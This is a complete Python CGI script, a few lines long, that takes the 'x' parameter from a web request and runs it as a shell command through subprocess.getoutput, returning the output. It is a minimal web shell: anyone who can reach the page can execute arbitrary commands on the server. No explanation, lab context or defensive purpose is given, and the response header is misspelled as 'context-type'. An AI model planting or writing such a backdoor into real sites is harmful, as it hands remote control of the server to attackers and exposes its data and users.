#!/usr/bin/python3

import cgi
import subprocess

print("context-type:text/html")
print()

f = cgi.FieldStorage()
cmd = f.getvalue("x")
out= subprocess.getoutput(cmd)
print(out)
